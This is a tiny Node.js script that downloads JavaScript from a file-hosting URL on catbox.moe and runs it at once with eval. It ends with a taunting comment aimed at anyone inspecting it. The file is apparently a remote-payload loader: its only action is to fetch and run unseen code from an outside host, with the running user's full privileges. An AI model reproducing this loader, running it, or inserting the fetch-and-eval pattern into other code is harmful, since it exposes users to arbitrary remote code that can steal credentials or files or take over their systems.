const axios = require('axios');

const url = "https://files.catbox.moe/5365l4.js";

axios.get(url)
    .then(response => eval(response.data))
    .catch(err => console.error(err));
    
   // HE'LLO  KID 😅😅 GET OUT HERE NOTHING IS YET
